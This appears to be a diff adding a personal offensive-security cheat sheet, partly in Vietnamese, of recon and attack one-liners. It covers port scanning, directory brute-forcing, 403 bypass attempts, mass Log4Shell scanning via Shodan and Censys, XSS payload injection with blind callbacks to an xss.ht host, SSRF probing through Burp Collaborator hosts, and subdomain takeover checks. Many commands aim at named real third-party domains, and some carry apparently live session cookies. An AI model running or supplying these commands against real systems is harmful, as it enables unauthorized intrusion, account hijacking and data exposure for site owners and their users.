@@ -1,0 +1,74 @@
+http://testphp.vulnweb.com/
+https://www.revshells.com/
+https://steflan-security.com/linux-tty-shell-cheat-sheet/
+ nmap -sn 10.0.10.1-254  (tìm ip)
+
+    nmap -v -T5 -p- -Pn <Ip>  ( tìm tất cả các port )
+
+    nmap -v -p22,80 -A <Ip>
+ls -al /usr/share/nmap/scripts/ | grep -e "smb"
+
+____ Urls Enumerate:
+gobuster dir -u http://10.0.2.18/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x txt,php,html 2>/dev/null
+/usr/share/wordlists/dirb/common.txt
+/usr/share/dirbuster/wordlists/directory-list-2.3-big.txt
+/usr/share/wordlists/dirb/big.txt
+
+echo esan.vn | waybackurls | uro
+
+python3 dirsearch.py -u 10.0.2.31 --exclude-status 401,500,404
+python3 dirsearch.py -u esan.vn --exclude-status 401,500,404 --cookie="lang=vn; PartnerCode=EPAY; Refer=bd671d1a39214cfbb6d6ffe5a8da4594; _ga_XY3LE58TKC=GS1.1.1655275533.2.1.1655278535.0; _ga=GA1.2.1148541260.1655258425; _gid=GA1.2.643939187.1655258427; mtn_session=crqkdvcf73cd8vh62edlqo5h8219dgqa; _gat_gtag_UA_132557449_7=1" --exclude-sizes 1KB -r
+
+go run gospider -s "http://10.0.2.15/" -d 0 -c 10
+gospider -s "https://portal.mpass.biz/" -d 0 -c 10 -v --cookie PHPSESSID=i13be34jlce6kg6rl8q2rski7f
+____ Other:
+nikto -h 10.0.2.15 -port 80
+
+searchsploit samba 2.3
+
+bash 403-bypass.sh -u https://sosvietnam.org/passwd --header
+
+bash 403-bypass.sh -u https://sosvietnam.org/passwd --protocol
+
+bash 403-bypass.sh -u https://sosvietnam.org/passwd --port
+
+bash 403-bypass.sh -u https://esan.vn/.user.ini --HTTPmethod
+
+python3 paramspider.py --domain esan.vn --level high --exclude js,css
+
+python3 sublist3r.py -v -d mta.edu.vn
+python3 sublist3r.py -v -e google,yahoo,virustotal -d mta.edu.vn
+
+ffuf -w seclists/Discovery/Web-Content/raft-large-wordslowercase.txt -c -v -u http://rakshit.org:80/dvwa/FUZZ -t 30 -b
+"PHPSESSID=cdkrv08sll9a0sg7t6np252f0g;showhints=1" -recursiondepth 2 -mc 200,201,203,204,205,302,403,401 -c -v -o restapiauthCookie.txt
+
+____expose host discovery:
+echo 'vuln:CVE-2021-44228' | uncover -q -e shodan,censys,fofa -v | httpx -silent | nuclei -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml
+
+echo bitrix | uncover -q -e shodan,censys,fofa | httpx 
+
+/root/nuclei-templates
+
+
+____xss:
+gau giống waybackurls, uro là lọc các dupplicate hoặc những url ko có giá trị (vd:js)
+
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+
+python3 paramspider.py --domain esan.vn/ --level high --exclude js,css | Gxss | dalfox pipe --mining-dict /usr/local/lib/python3.9/dist-packages/arjun/db/large.txt --skip-bav
+
+echo esan.vn | waybackurls | gf xss | uro | dalfox pipe --mining-dict /usr/local/lib/python3.9/dist-packages/arjun/db/large.txt --skip-bav
+echo esan.vn | waybackurls | gf xss | uro | dalfox pipe --mass
+echo esan.vn | waybackurls | gf xss | uro | dalfox pipe -o twitch --blind https://nagini.xss.ht
+
+subfinder -d mta.edu.vn -silent -all | waybackurls | gf xss | uro | sort -u | nuclei -tags xss -rl 20 -c 10
+
+____SSRF:
+~/Desktop/Tool/ssrf_check.go (thay key trong source code)
+findomain -t testphp.vulnweb.com -q | httpx -silent -threads 1000 | gau | uro | grep "=" | qsreplace dfwnjqe3021j13oy1lu6xmq89zfq3f.burpcollaborator.net | go run ssrf_check.go
+echo testphp.vulnweb.com | waybackurls | gf ssrf | uro | qsreplace http://of76nmh9vc8jwqqghv6fl2y980er2g.burpcollaborator.net | go run ssrf_check.go
+
+____domain takeover:
+subfinder -d razer.com -o ~/Desktop/dt.txt #~~~# subjack -w ~/Desktop/dt.txt -v
+findomain -t razer.com -o                  #~~~# SubOver -l ~/Desktop/dt.txt -a
+										
